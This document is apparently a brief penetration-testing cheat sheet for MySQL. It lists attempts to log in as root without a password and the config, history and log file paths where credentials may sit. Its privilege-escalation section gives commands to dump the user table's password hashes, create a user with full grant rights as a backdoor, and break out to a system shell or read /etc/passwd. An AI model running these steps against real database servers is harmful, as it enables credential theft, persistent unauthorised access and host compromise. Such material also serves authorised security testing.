# Connection tests
```
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
mysql -h <Hostname>
mysql -h <Hostname> -u ""@localhost
```

# Configuration files
```
windows

config.ini
my.ini
windows\my.ini
winnt\my.ini
<InstDir>/mysql/data/

UNIX

/etc/my.cnf
/etc/mysql/my.cnf
/var/lib/mysql/my.cnf
~/.my.cnf
/etc/my.cnf
```

Command history
```
~/.mysql.history
```

Log files:
```
connections.log
update.log
common.log
```

# Privilege Escalation

Current access level:
```
mysql>select user();
mysql>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

Access passwords:
```
mysql> use mysql
mysql> select user,password from user;
```

Create new user and grant permissions:
```
mysql>create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```

Break into shell:
```
mysql> \! cat /etc/passwd
mysql> \! bash
```
